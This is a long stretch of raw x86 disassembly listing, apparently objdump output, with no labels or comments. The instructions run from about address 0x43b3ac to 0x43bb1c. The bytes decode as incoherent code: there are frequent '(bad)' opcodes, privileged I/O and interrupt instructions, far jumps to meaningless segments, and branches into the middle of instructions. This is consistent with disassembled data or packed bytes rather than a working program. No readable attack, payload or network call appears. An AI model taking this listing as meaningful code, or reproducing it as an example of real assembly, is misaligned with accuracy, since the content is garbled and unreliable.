  43b3ac:	test   eax,0xf41e3bc2
  43b3b1:	inc    ecx
  43b3b2:	jle    0x43b35c
  43b3b4:	aam    0xf8
  43b3b6:	push   esp
  43b3b7:	add    dl,al
  43b3b9:	inc    eax
  43b3ba:	test   BYTE PTR [edx+0x63b20a27],al
  43b3c0:	rol    BYTE PTR [ebx],0x89
  43b3c3:	sbb    al,BYTE PTR [eax+0x19]
  43b3c6:	data16 xchg BYTE PTR [edx+0x56],dl
  43b3ca:	and    al,0x30
  43b3cc:	mov    dl,0x56
  43b3ce:	inc    edx
  43b3cf:	xor    BYTE PTR [ecx+0x6c2f40a8],bh
  43b3d5:	lods   al,BYTE PTR ds:[esi]
  43b3d6:	rcr    BYTE PTR [edx],0x70
  43b3d9:	mov    eax,0xd01fde9b
  43b3de:	xchg   BYTE PTR [ebx-0x6a],ch
  43b3e1:	bound  ecx,QWORD PTR [edx-0x78]
  43b3e4:	inc    esp
  43b3e5:	xchg   esp,eax
  43b3e6:	jl     0x43b374
  43b3e8:	dec    ebp
  43b3e9:	cs sbb cl,ah
  43b3ec:	cli    
  43b3ed:	cld    
  43b3ee:	loop   0x43b40b
  43b3f0:	or     ch,BYTE PTR [edx]
  43b3f2:	push   ds
  43b3f3:	xor    al,0x92
  43b3f5:	pop    esi
  43b3f6:	dec    ebp
  43b3f7:	sub    dh,BYTE PTR ds:0xd41dd0c2
  43b3fd:	(bad)  
  43b3fe:	push   eax
  43b3ff:	popa   
  43b400:	pop    esi
  43b401:	mov    al,ds:0x8e86206d
  43b406:	push   esi
  43b407:	(bad)  
  43b408:	ss xor eax,0xa6e23d57
  43b40e:	ret    
  43b40f:	ror    BYTE PTR [ecx+0x0],0x9a
  43b413:	out    dx,eax
  43b414:	lods   al,BYTE PTR ds:[esi]
  43b415:	out    dx,al
  43b416:	xchg   edx,eax
  43b417:	test   DWORD PTR [ebp-0x4c975fb9],ebp
  43b41d:	cmp    esi,DWORD PTR [edx+0x7]
  43b420:	push   0x45
  43b422:	rol    ebp,cl
  43b424:	les    eax,FWORD PTR [edx-0x2fc97bcc]
  43b42a:	data16 cmp al,0x84
  43b42d:	sbb    DWORD PTR ds:0x54ee4e84,0xffffff85
  43b434:	mov    esi,0xe2e8c3b0
  43b439:	cdq    
  43b43a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b43b:	mov    eax,0xad9a0736
  43b440:	neg    BYTE PTR [ecx]
  43b442:	push   esp
  43b443:	jp     0x43b3f5
  43b445:	xchg   ecx,eax
  43b446:	and    al,0xfa
  43b448:	push   0xfffffff1
  43b44a:	and    eax,0x238ea5e1
  43b44f:	push   esi
  43b450:	xor    BYTE PTR [eax+eax*2-0x3f254ad8],cl
  43b457:	xlat   BYTE PTR ds:[ebx]
  43b458:	adc    dh,BYTE PTR [ecx]
  43b45a:	test   eax,0x456c2522
  43b45f:	mov    dh,0x3c
  43b461:	lods   eax,DWORD PTR ds:[esi]
  43b462:	std    
  43b463:	fdivr  QWORD PTR [esi]
  43b465:	call   FWORD PTR [eax+esi*4]
  43b468:	mov    dh,0xc0
  43b46a:	sub    eax,DWORD PTR [eax]
  43b46c:	cvttps2pi mm7,QWORD PTR [esi-0x76bed25]
  43b473:	mov    al,ds:0x5e471222
  43b478:	pmaxsw mm2,QWORD PTR [edx+0x0]
  43b47c:	int3   
  43b47d:	es ds fadd st(1),st
  43b481:	push   es
  43b482:	(bad)  
  43b483:	imul   edx,DWORD PTR [edx],0x45
  43b486:	xchg   dh,dl
  43b488:	nop
  43b489:	mov    ds:0x93536992,al
  43b48e:	std    
  43b48f:	lock cmc 
  43b491:	mov    ch,0x10
  43b493:	xchg   esp,eax
  43b494:	repnz or ch,BYTE PTR [edi-0x4bd7c13]
  43b49b:	and    DWORD PTR [esi+ecx*8],ecx
  43b49e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b49f:	mov    ds,WORD PTR [ecx+0x5a]
  43b4a2:	and    esp,0xffffffd4
  43b4a5:	push   es
  43b4a6:	mov    eax,0x9122b7bc
  43b4ab:	lock enter 0x2228,0xbc
  43b4b0:	out    dx,al
  43b4b1:	push   ss
  43b4b2:	dec    eax
  43b4b3:	mov    DWORD PTR [ecx],edx
  43b4b5:	mov    WORD PTR [edi+0x16],ss
  43b4b8:	fdivrp st(6),st
  43b4ba:	cmp    DWORD PTR [edx],eax
  43b4bc:	inc    ebx
  43b4bd:	sbb    BYTE PTR [ebx-0x2de6a31d],bl
  43b4c3:	sar    BYTE PTR [esi],1
  43b4c5:	arpl   WORD PTR [eax+0x7e],ax
  43b4c8:	or     al,al
  43b4ca:	scas   al,BYTE PTR es:[edi]
  43b4cb:	push   ss
  43b4cc:	in     al,dx
  43b4cd:	aam    0x17
  43b4cf:	cmp    al,BYTE PTR [eax+0x7b]
  43b4d2:	mov    esp,0xb4840781
  43b4d7:	xchg   BYTE PTR [eax-0x15bde108],ah
  43b4dd:	jo     0x43b479
  43b4df:	mov    ah,0x6
  43b4e1:	dec    edx
  43b4e2:	pop    esp
  43b4e3:	push   ds
  43b4e4:	jno    0x43b46e
  43b4e6:	pop    es
  43b4e7:	mov    al,ds:0xbc0a0d66
  43b4ec:	adc    al,0xd2
  43b4ee:	lar    ebx,WORD PTR [eax-0x1e]
  43b4f2:	adc    DWORD PTR [edx],edx
  43b4f4:	sub    al,0x17
  43b4f6:	(bad)  
  43b4f7:	pop    ds
  43b4f8:	es lock inc eax
  43b4fb:	sub    bh,BYTE PTR [ecx+0x23cf14b8]
  43b501:	pop    ecx
  43b502:	mov    edi,0xf97a45a4
  43b507:	fcomip st,st(0)
  43b509:	or     DWORD PTR [eax],ecx
  43b50b:	sub    eax,0x303df4d5
  43b510:	bound  eax,QWORD PTR [eax-0x53bcf3af]
  43b516:	jb     0x43b597
  43b518:	jo     0x43b562
  43b51a:	pusha  
  43b51b:	mov    ebx,0x74524a3a
  43b520:	stos   DWORD PTR es:[edi],eax
  43b521:	adc    al,0x97
  43b523:	push   esp
  43b524:	mov    esi,edx
  43b526:	push   eax
  43b527:	xor    cl,dh
  43b529:	or     BYTE PTR [eax-0x2639f53c],cl
  43b52f:	fcom   DWORD PTR [edx+edi*4+0x56ffde22]
  43b536:	jo     0x43b54e
  43b538:	fisttp QWORD PTR [ebp-0x33]
  43b53b:	lock push ebx
  43b53d:	cwde   
  43b53e:	int3   
  43b53f:	test   BYTE PTR [edx-0x60],cl
  43b542:	cld    
  43b543:	inc    esi
  43b544:	mov    edx,eax
  43b546:	adc    DWORD PTR [eax+0x68f86005],eax
  43b54c:	out    0x6,al
  43b54e:	mov    al,0x2f
  43b550:	inc    ebx
  43b551:	inc    ebp
  43b552:	push   esp
  43b553:	xchg   esp,eax
  43b554:	loop   0x43b520
  43b556:	and    dh,al
  43b558:	add    al,0xe3
  43b55a:	ret    0xa22c
  43b55d:	mov    cs,WORD PTR [edx+0x15]
  43b560:	mov    ch,0x59
  43b562:	daa    
  43b563:	push   esp
  43b564:	loop   0x43b4fa
  43b566:	add    al,0x58
  43b568:	ins    DWORD PTR es:[edi],dx
  43b569:	sahf   
  43b56a:	stos   DWORD PTR es:[edi],eax
  43b56b:	rol    DWORD PTR [ebx+eax*8-0x59],cl
  43b56f:	pop    esp
  43b570:	fidivr WORD PTR [eax]
  43b572:	int    0x44
  43b574:	cmp    ah,dh
  43b576:	add    al,0xf6
  43b578:	sub    eax,0x96fc09cc
  43b57d:	shl    DWORD PTR [edi+edx*8-0x2c],1
  43b581:	ret    
  43b582:	jmp    0x43b524
  43b584:	test   BYTE PTR [eax+0x2ec6a1e],dl
  43b58a:	les    ebp,FWORD PTR [edi]
  43b58c:	sbb    DWORD PTR ds:0x1101850,ecx
  43b592:	mov    esp,0x4fa141bc
  43b597:	loop   0x43b5c0
  43b599:	mov    DWORD PTR [edx-0x29ff5d9e],ebp
  43b59f:	shl    BYTE PTR [edx-0x452f35ba],cl
  43b5a5:	xchg   BYTE PTR [eax],bh
  43b5a7:	mov    ah,0x52
  43b5a9:	or     edx,DWORD PTR ds:0x127ed986
  43b5af:	xchg   edx,eax
  43b5b0:	adc    al,0x28
  43b5b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b5b3:	daa    
  43b5b4:	inc    edx
  43b5b5:	inc    esp
  43b5b6:	out    dx,al
  43b5b7:	test   BYTE PTR ds:0x36a2cfb4,dh
  43b5bd:	(bad)  
  43b5be:	pop    ss
  43b5bf:	xchg   ebp,eax
  43b5c0:	(bad)  
  43b5c1:	shr    DWORD PTR [ebp-0x7eca4ffc],1
  43b5c7:	cs popa 
  43b5c9:	ret    0x5a55
  43b5cc:	cs push ebp
  43b5ce:	das    
  43b5cf:	add    DWORD PTR [ecx+ebp*4+0x46],esi
  43b5d3:	xchg   ebx,eax
  43b5d4:	or     BYTE PTR [eax],bl
  43b5d6:	mov    al,0x8d
  43b5d8:	leave  
  43b5d9:	jbe    0x43b5f5
  43b5db:	sbb    BYTE PTR [edx],al
  43b5dd:	and    al,0xdc
  43b5df:	call   0xeec9:0xeb217868
  43b5e6:	fsubr  st(3),st
  43b5e8:	mov    dh,0x54
  43b5ea:	add    DWORD PTR [bp-0x7c20],esi
  43b5ef:	js     0x43b5ba
  43b5f1:	push   ds
  43b5f2:	into   
  43b5f3:	and    eax,0xac95c24c
  43b5f8:	bound  eax,QWORD PTR [eax-0x60ad352d]
  43b5fe:	inc    esp
  43b5ff:	mov    al,ds:0x860ce088
  43b604:	sbb    edi,DWORD PTR [edx+0x4847dab4]
  43b60a:	mov    BYTE PTR [ebx+0x70],bl
  43b60d:	fs or  eax,0xb1b42899
  43b613:	xchg   esi,eax
  43b614:	pop    eax
  43b615:	ficom  WORD PTR [ecx]
  43b617:	add    al,0x2c
  43b619:	jo     0x43b5b7
  43b61b:	sbb    BYTE PTR [ecx+0x36],ch
  43b61e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b61f:	call   0x6825:0xc7e22fa0
  43b626:	jle    0x43b608
  43b628:	mov    DWORD PTR [ebp-0x35eb60bb],esi
  43b62e:	scas   eax,DWORD PTR es:[edi]
  43b62f:	xacquire xchg DWORD PTR [edi],esi
  43b632:	retf   0x870a
  43b635:	lea    eax,[edi]
  43b637:	mov    ds:0x75646082,eax
  43b63c:	ins    BYTE PTR es:[edi],dx
  43b63d:	ss mov ah,0x29
  43b640:	or     esi,edi
  43b642:	mov    dl,0xb7
  43b644:	mov    al,ds:0xbd63b436
  43b649:	int3   
  43b64a:	jmp    0xe8dfa0ab
  43b64f:	jnp    0x43b6cb
  43b651:	clc    
  43b652:	sub    BYTE PTR [eax+0x28125745],0x37
  43b659:	jp     0x43b62c
  43b65b:	mov    ebp,0x31ea03d7
  43b660:	pop    edx
  43b661:	test   al,0x62
  43b663:	clc    
  43b664:	lods   eax,DWORD PTR ds:[esi]
  43b665:	sub    eax,ecx
  43b667:	or     eax,0x145258e0
  43b66c:	mov    edx,0x604814fd
  43b671:	test   al,0x68
  43b673:	inc    esp
  43b674:	mov    ah,0xec
  43b676:	push   0x2693ea2
  43b67b:	fisttp WORD PTR [edx+0x7ec8b02b]
  43b681:	push   ecx
  43b682:	push   0x807cc75a
  43b687:	jns    0x43b65a
  43b689:	lock dec ebp
  43b68b:	jl     0x43b633
  43b68d:	push   eax
  43b68e:	sbb    BYTE PTR [edx+0x1e],0x52
  43b692:	jecxz  0x43b6d6
  43b694:	inc    eax
  43b695:	(bad)  [ebp+eiz*8+0x607716b7]
  43b69c:	div    DWORD PTR [ecx-0x55fa3d5f]
  43b6a2:	inc    esi
  43b6a3:	mov    cl,0x62
  43b6a5:	out    dx,eax
  43b6a6:	popf   
  43b6a7:	fcom   st(0)
  43b6a9:	in     al,dx
  43b6aa:	daa    
  43b6ab:	mov    BYTE PTR [edx],dh
  43b6ad:	lods   al,BYTE PTR ds:[esi]
  43b6ae:	jo     0x43b638
  43b6b0:	cli    
  43b6b1:	aam    0xc4
  43b6b3:	push   ss
  43b6b4:	cs dec eax
  43b6b6:	xor    al,0xaf
  43b6b8:	jl     0x43b71b
  43b6ba:	add    BYTE PTR [edx-0x72455f4f],al
  43b6c0:	dec    ebp
  43b6c1:	and    al,0x2a
  43b6c3:	sbb    al,BYTE PTR [edx]
  43b6c5:	mov    ds:0x52aea988,al
  43b6ca:	pop    eax
  43b6cb:	lock dec ebp
  43b6cd:	add    cl,BYTE PTR [esi+0x12]
  43b6d0:	js     0x43b68d
  43b6d2:	mov    cl,0x6a
  43b6d4:	adc    ecx,DWORD PTR [edx+0x92db8df]
  43b6da:	push   edx
  43b6db:	sub    BYTE PTR [esi+eiz*2+0x11],0x5d
  43b6e0:	dec    edx
  43b6e1:	fidiv  DWORD PTR [eax+eiz*4-0x2e]
  43b6e5:	sbb    BYTE PTR [ebx+0x760085e0],al
  43b6eb:	jmp    0xc17c954
  43b6f0:	js     0x43b6fb
  43b6f2:	imul   esi,esi,0x1bf078f9
  43b6f8:	push   cs
  43b6f9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b6fa:	mov    WORD PTR [edi],gs
  43b6fc:	mov    al,0x9e
  43b6fe:	lock xchg esi,eax
  43b700:	xchg   edi,eax
  43b701:	add    al,0xb5
  43b703:	test   eax,0xd7303497
  43b708:	push   eax
  43b709:	push   ebx
  43b70a:	inc    ecx
  43b70b:	lea    eax,[esi+ecx*4-0x43974c7e]
  43b712:	and    al,0x60
  43b714:	push   ebx
  43b715:	imul   ebp,eax,0xffffffed
  43b718:	mov    ds,WORD PTR [ebx]
  43b71a:	push   0xffffffee
  43b71c:	mov    ch,0xa0
  43b71e:	push   ds
  43b71f:	(bad)  
  43b721:	pop    edx
  43b722:	outs   dx,BYTE PTR ds:[esi]
  43b723:	not    DWORD PTR [esi+0x1253e091]
  43b729:	add    DWORD PTR [eax],edi
  43b72b:	out    0xa7,al
  43b72d:	cmp    BYTE PTR ds:0xa334160,al
  43b733:	call   0xcbda8f53
  43b738:	mov    al,0x3a
  43b73a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b73b:	jbe    0x43b79d
  43b73d:	add    DWORD PTR [esi],ebp
  43b73f:	xchg   ebp,eax
  43b740:	retf   0x9a42
  43b743:	sbb    cl,BYTE PTR [edx-0x69]
  43b746:	and    cl,0xd1
  43b749:	pop    edx
  43b74a:	fs push edi
  43b74c:	stos   DWORD PTR es:[edi],eax
  43b74d:	imul   ebx,DWORD PTR [edx],0xb
  43b750:	ss daa 
  43b752:	or     eax,0xa9fc2ca4
  43b757:	jmp    0x5de4:0xae9ba131
  43b75e:	jmp    0xb2ab:0xdfa81f5
  43b765:	fstp   QWORD PTR [esi-0x4a2c0f90]
  43b76b:	dec    ecx
  43b76c:	(bad)  
  43b76d:	shr    BYTE PTR [edx+0x13],1
  43b770:	std    
  43b771:	push   eax
  43b772:	or     al,BYTE PTR [edx]
  43b774:	xchg   edi,eax
  43b775:	test   al,0xe
  43b777:	mov    dh,bl
  43b779:	fs inc edx
  43b77b:	fcom   QWORD PTR [eax]
  43b77d:	inc    eax
  43b77e:	fst    QWORD PTR [edx-0x7196b2a5]
  43b784:	mov    BYTE PTR [edx+ebx*4+0x7094268c],dh
  43b78b:	sub    ah,al
  43b78d:	add    BYTE PTR [edx],0xab
  43b790:	pushf  
  43b791:	pop    ds
  43b792:	push   0xffffffea
  43b794:	push   esi
  43b795:	(bad)  
  43b796:	and    cl,BYTE PTR [ebx-0x30ef9d94]
  43b79c:	add    ah,ch
  43b79e:	xor    al,0x8e
  43b7a0:	xor    eax,0xeda82d5
  43b7a5:	sub    DWORD PTR [eax+esi*1-0x29365136],edx
  43b7ac:	test   al,0xa9
  43b7ae:	loope  0x43b758
  43b7b0:	push   edi
  43b7b1:	fiadd  DWORD PTR [ebx-0x42]
  43b7b4:	call   FWORD PTR [eax-0x666d9940]
  43b7ba:	in     al,dx
  43b7bb:	push   0xffffff82
  43b7bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b7be:	in     eax,0x34
  43b7c0:	xor    eax,0x902a135c
  43b7c5:	enter  0x5ee0,0x4d
  43b7c9:	and    dl,BYTE PTR [esi+0x28]
  43b7cc:	sub    DWORD PTR [edx],esi
  43b7ce:	inc    esi
  43b7cf:	(bad)  
  43b7d0:	int3   
  43b7d1:	dec    ecx
  43b7d2:	mov    edi,0xda665788
  43b7d7:	jno    0x43b841
  43b7d9:	lahf   
  43b7da:	loopne 0x43b7bb
  43b7dc:	mov    dl,0xb6
  43b7de:	inc    edi
  43b7df:	push   es
  43b7e0:	into   
  43b7e1:	fs ds call 0xe0bcae94
  43b7e8:	add    eax,DWORD PTR [ecx-0x7375c3c5]
  43b7ee:	cmp    bl,BYTE PTR [eax]
  43b7f0:	pop    ebp
  43b7f1:	lods   eax,DWORD PTR ds:[esi]
  43b7f2:	push   ecx
  43b7f3:	or     bh,ch
  43b7f5:	fmul   QWORD PTR fs:[edx+0x76]
  43b7f9:	icebp  
  43b7fa:	sub    eax,0x5e22856b
  43b7ff:	mov    bh,0x9b
  43b801:	(bad)  
  43b802:	jne    0x43b856
  43b804:	and    ecx,DWORD PTR [ebx+eax*1]
  43b807:	adc    al,0x5a
  43b809:	test   DWORD PTR ds:0x3082e90a,ecx
  43b80f:	fcomp  QWORD PTR es:[edx]
  43b812:	sbb    al,BYTE PTR ds:0xca68d422
  43b818:	cmc    
  43b819:	aam    0x0
  43b81b:	stc    
  43b81c:	stos   DWORD PTR es:[edi],eax
  43b81d:	test   eax,0xa61c0b7e
  43b822:	scas   al,BYTE PTR es:[edi]
  43b823:	push   esp
  43b824:	add    BYTE PTR [edi+0x668a0b42],0x90
  43b82b:	daa    
  43b82c:	mov    eax,0x15818172
  43b831:	or     eax,0x8016cdec
  43b836:	jno    0x43b7c8
  43b838:	or     DWORD PTR [ebx],edi
  43b83a:	ins    BYTE PTR es:[edi],dx
  43b83b:	ror    DWORD PTR [ecx-0x47fddb5e],0x24
  43b842:	scas   eax,DWORD PTR es:[edi]
  43b843:	jg     0x43b7f1
  43b845:	push   edi
  43b846:	adc    BYTE PTR [esi],bh
  43b848:	stos   BYTE PTR es:[edi],al
  43b849:	xor    eax,0xde5e56f5
  43b84e:	es shr dl,1
  43b851:	add    eax,0x91462606
  43b856:	test   BYTE PTR [ebx-0x13],ch
  43b859:	fwait
  43b85a:	stos   BYTE PTR es:[edi],al
  43b85b:	ficomp DWORD PTR [esi-0x4a]
  43b85e:	mov    dh,0x8e
  43b860:	mov    ch,0x40
  43b862:	pop    si
  43b864:	aam    0x67
  43b866:	push   ecx
  43b867:	ins    DWORD PTR es:[edi],dx
  43b868:	or     ch,BYTE PTR [edi-0x7bb94c30]
  43b86e:	dec    ebp
  43b86f:	int    0x4d
  43b871:	loop   0x43b83c
  43b873:	mov    eax,0x32d68c7c
  43b878:	inc    esp
  43b879:	xchg   edx,eax
  43b87a:	popa   
  43b87b:	out    0x29,al
  43b87d:	add    dh,ah
  43b87f:	data16 add BYTE PTR [ebx-0x30],dl
  43b883:	cmp    BYTE PTR [esp+eiz*8],al
  43b886:	pop    ss
  43b887:	mov    WORD PTR [ecx+edi*1],es
  43b88a:	mov    BYTE PTR [ebx+0x62],cl
  43b88d:	sbb    ch,dl
  43b88f:	sahf   
  43b890:	imul   ebx,DWORD PTR [esi],0x0
  43b893:	or     DWORD PTR [ebp-0x53],0x2e942d28
  43b89a:	jl     0x43b88f
  43b89c:	sti    
  43b89d:	(bad)  
  43b89e:	(bad)  
  43b89f:	call   0xdc40:0x657686fd
  43b8a6:	sbb    eax,0x83342204
  43b8ab:	adc    BYTE PTR [ecx+0xc59eba3],ah
  43b8b1:	ret    0xdff2
  43b8b4:	pop    edx
  43b8b5:	arpl   WORD PTR [esi-0x19f3be4b],di
  43b8bb:	push   0x5cc078f5
  43b8c0:	and    al,dh
  43b8c2:	pop    ecx
  43b8c3:	or     ebp,DWORD PTR [eax-0x2401b7ba]
  43b8c9:	(bad)  
  43b8ca:	jmp    0x43b8f3
  43b8cc:	mov    WORD PTR [edi-0xb05825e],es
  43b8d2:	push   esp
  43b8d3:	or     DWORD PTR [edx-0x5d],edx
  43b8d6:	lock and al,0x98
  43b8d9:	ror    BYTE PTR [eax+eax*2+0x7e],0x51
  43b8de:	out    dx,eax
  43b8df:	or     DWORD PTR [eax],esp
  43b8e1:	jl     0x43b92f
  43b8e3:	mov    ecx,0x9bcd21be
  43b8e8:	push   ds
  43b8e9:	int    0x1b
  43b8eb:	mov    al,0x70
  43b8ed:	add    dh,ch
  43b8ef:	sbb    DWORD PTR [eax-0x27ffd90f],esi
  43b8f5:	push   ecx
  43b8f6:	sub    ch,BYTE PTR [edx]
  43b8f8:	xor    al,BYTE PTR [esp+eiz*8-0x56]
  43b8fc:	jmp    0x43b8aa
  43b8fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b8ff:	inc    esi
  43b900:	sub    DWORD PTR [esi+0x462635ea],0xa0b48027
  43b90a:	cmp    eax,edx
  43b90c:	sar    al,1
  43b90e:	scas   al,BYTE PTR es:[edi]
  43b90f:	and    BYTE PTR [ecx],ah
  43b911:	inc    esp
  43b912:	push   0x4c
  43b914:	mov    esp,0x9cd48fce
  43b919:	(bad)  
  43b91a:	test   eax,0x1f9ed056
  43b91f:	adc    bl,BYTE PTR [ecx+0x14222358]
  43b925:	sbb    DWORD PTR fs:[esi],ecx
  43b928:	sbb    bl,BYTE PTR ds:0x81f4af72
  43b92e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43b92f:	inc    ebp
  43b930:	es js  0x43b93b
  43b933:	popa   
  43b934:	int3   
  43b935:	xchg   esi,eax
  43b936:	push   ss
  43b937:	xor    al,0x3d
  43b939:	loop   0x43b8d8
  43b93b:	fstp   QWORD PTR [esi-0x5e]
  43b93e:	lods   al,BYTE PTR ds:[esi]
  43b93f:	cs and al,0x1a
  43b942:	pop    edx
  43b943:	push   edi
  43b944:	pop    ebx
  43b945:	lods   eax,DWORD PTR ds:[esi]
  43b946:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b947:	push   ss
  43b948:	cli    
  43b949:	jp     0x43b92d
  43b94b:	lods   al,BYTE PTR ds:[esi]
  43b94c:	dec    esi
  43b94d:	ret    
  43b94e:	inc    edx
  43b94f:	push   0xffffffb2
  43b951:	lods   eax,DWORD PTR ds:[esi]
  43b952:	mov    esi,0xb20f818e
  43b957:	inc    eax
  43b958:	push   esp
  43b959:	or     bl,BYTE PTR [ebp+0x22]
  43b95c:	lods   al,BYTE PTR ds:[esi]
  43b95d:	sub    BYTE PTR [edx],cl
  43b95f:	jl     0x43b9db
  43b961:	mov    bl,0x80
  43b963:	pop    ss
  43b964:	aam    0x23
  43b966:	or     BYTE PTR [esi],bl
  43b968:	adc    dh,BYTE PTR [edx-0x5c]
  43b96b:	and    ebx,eax
  43b96d:	movhlps xmm7,xmm0
  43b970:	ss jg  0x43b9bd
  43b973:	sbb    BYTE PTR [edi-0x71],bl
  43b976:	push   0x46c2e162
  43b97b:	mov    ah,0x22
  43b97d:	ret    
  43b97e:	and    ch,BYTE PTR [ebp+0x6e184a09]
  43b984:	mov    esp,0x53d0bee0
  43b989:	mov    ebx,0x2cc01c1a
  43b98e:	adc    DWORD PTR [edx+0xc],esp
  43b991:	fmul   QWORD PTR [ecx-0x40]
  43b994:	sub    BYTE PTR [ebx+0x58],0xdd
  43b998:	push   ds
  43b999:	int    0x1
  43b99b:	fwait
  43b99c:	jns    0x43b99f
  43b99e:	jle    0x43b9c2
  43b9a0:	push   edi
  43b9a1:	inc    ecx
  43b9a2:	cs repz add bl,dh
  43b9a6:	inc    ecx
  43b9a7:	ror    BYTE PTR [edi],1
  43b9a9:	jbe    0x43b984
  43b9ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b9ac:	dec    edi
  43b9ad:	sbb    edi,DWORD PTR [esi-0x684635ca]
  43b9b3:	mov    esi,0x6a0bf10
  43b9b8:	mov    esi,cs
  43b9ba:	push   es
  43b9bb:	xchg   esp,eax
  43b9bc:	sub    edx,DWORD PTR [eax-0xc]
  43b9bf:	xchg   BYTE PTR [edi+0x52],ch
  43b9c2:	and    eax,0x4993f8
  43b9c7:	push   eax
  43b9c8:	ds adc al,0x4
  43b9cb:	push   ds
  43b9cc:	or     DWORD PTR [eax+0x54],ebx
  43b9cf:	xor    esi,DWORD PTR es:[edx+0x5465015f]
  43b9d6:	nop
  43b9d7:	cmp    BYTE PTR [esi-0x4c],ah
  43b9da:	dec    eax
  43b9db:	push   esp
  43b9dc:	adc    eax,0x1478d9f6
  43b9e1:	das    
  43b9e2:	inc    esp
  43b9e3:	cmp    cl,BYTE PTR [ebp-0x238fb917]
  43b9e9:	pushf  
  43b9ea:	les    eax,FWORD PTR [edi]
  43b9ec:	mov    BYTE PTR [ecx],ah
  43b9ee:	call   0x63ed8abf
  43b9f3:	dec    ecx
  43b9f4:	mov    esi,edx
  43b9f6:	jno    0x43b994
  43b9f8:	adc    ch,BYTE PTR [esi+0x41]
  43b9fb:	jp     0x43ba23
  43b9fd:	or     ah,BYTE PTR [esi+0x3a]
  43ba00:	push   0x491527df
  43ba05:	adc    BYTE PTR [esi],cl
  43ba07:	adc    DWORD PTR ss:[edx+0x4e],0x2fc21ae2
  43ba0f:	xchg   BYTE PTR [esi],bl
  43ba11:	cmp    edi,DWORD PTR [edx]
  43ba13:	inc    edx
  43ba14:	mov    al,0x0
  43ba16:	add    eax,0xf1344fa2
  43ba1b:	sahf   
  43ba1c:	scas   al,BYTE PTR es:[edi]
  43ba1d:	mov    cl,0xc8
  43ba1f:	sub    DWORD PTR [ecx-0x67dd07f0],ebp
  43ba25:	rol    DWORD PTR [ebx],cl
  43ba27:	ins    DWORD PTR es:[edi],dx
  43ba28:	lods   al,BYTE PTR ds:[esi]
  43ba29:	mov    eax,0x641b4ca2
  43ba2e:	inc    esi
  43ba2f:	fild   QWORD PTR ds:0xd4f8181c
  43ba35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43ba36:	gs nop
  43ba38:	out    dx,eax
  43ba39:	sbb    BYTE PTR [esi+0x34],cl
  43ba3c:	cmp    DWORD PTR [edx],edx
  43ba3e:	mov    eax,0x2076d4bf
  43ba43:	ins    BYTE PTR es:[edi],dx
  43ba44:	inc    esi
  43ba45:	scas   al,BYTE PTR es:[edi]
  43ba46:	push   ss
  43ba47:	test   BYTE PTR [edi],bl
  43ba49:	pop    esi
  43ba4a:	bound  ecx,QWORD PTR [edx]
  43ba4c:	lea    esp,[ecx-0x566d26da]
  43ba52:	add    al,0xbe
  43ba54:	mov    BYTE PTR [edx+ecx*4+0x6488ad6],dl
  43ba5b:	push   esi
  43ba5c:	(bad)  
  43ba5d:	and    dl,cl
  43ba5f:	out    dx,al
  43ba60:	cli    
  43ba61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43ba62:	cmc    
  43ba63:	adc    dl,al
  43ba65:	stos   DWORD PTR es:[edi],eax
  43ba66:	adc    esp,esp
  43ba68:	mov    ch,BYTE PTR [edi-0x4554a4ad]
  43ba6e:	sahf   
  43ba6f:	aam    0x7e
  43ba71:	rcl    BYTE PTR [edx-0x55],1
  43ba74:	fsub   QWORD PTR [ecx-0x38]
  43ba77:	or     al,0x7c
  43ba79:	and    al,0x3e
  43ba7b:	sbb    BYTE PTR cs:[eax-0x58],0xec
  43ba80:	in     eax,dx
  43ba81:	sbb    ebx,0xffffffd2
  43ba84:	add    DWORD PTR [edx-0x9],ebp
  43ba87:	retf   0xb74
  43ba8a:	clc    
  43ba8b:	imul   esp,DWORD PTR [edx+0x1c],0x488c4a6e
  43ba92:	imul   edi,DWORD PTR [ebx+0x30],0xa0486e7e
  43ba99:	xor    al,0xd6
  43ba9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ba9c:	popa   
  43ba9d:	(bad)  
  43ba9e:	mov    ecx,0x2c2fd824
  43baa3:	cmc    
  43baa4:	sbb    dl,bh
  43baa6:	cld    
  43baa7:	dec    eax
  43baa8:	cld    
  43baa9:	mov    ds:0x45207cb1,al
  43baae:	(bad)  
  43bab0:	dec    esp
  43bab1:	mov    ds:0x309f61d6,al
  43bab6:	push   cs
  43bab7:	xor    BYTE PTR [edx-0x69dde716],0xaa
  43babe:	or     eax,0xd5c050e2
  43bac3:	sbb    eax,0x36f8597e
  43bac8:	mov    ch,0xdd
  43baca:	(bad)  
  43bacb:	add    BYTE PTR cs:[ebx-0x72],bh
  43bacf:	dec    edx
  43bad0:	mov    WORD PTR [eax+ecx*4],?
  43bad3:	xchg   ecx,eax
  43bad4:	shr    DWORD PTR [eax],1
  43bad6:	push   0xfae47c4a
  43badb:	je     0x43ba87
  43badd:	fs push 0x41
  43bae0:	inc    ebp
  43bae1:	mov    ds:0x7254e916,eax
  43bae6:	inc    ebp
  43bae7:	sbb    eax,0xa474d899
  43baec:	clc    
  43baed:	loop   0x43ba8c
  43baef:	xchg   esp,eax
  43baf0:	and    al,0x14
  43baf2:	cld    
  43baf3:	add    eax,0x5370aa46
  43baf8:	ret    0x1742
  43bafb:	push   0x3c1500
  43bb00:	cmp    al,0xc4
  43bb02:	dec    ebx
  43bb03:	add    bl,al
  43bb05:	stc    
  43bb06:	push   ds
  43bb07:	call   0x87f375ed
  43bb0c:	lock add esi,DWORD PTR [ebx+ebx*4]
  43bb10:	mov    edx,0xf140988e
  43bb15:	dec    eax
  43bb16:	(bad)  
  43bb17:	sub    cl,BYTE PTR [edx-0x34]
  43bb1a:	lods   al,BYTE PTR ds:[esi]
  43bb1b:	xlat   BYTE PTR ds:[ebx]
  43bb1c:	jbe    0x43bb2b
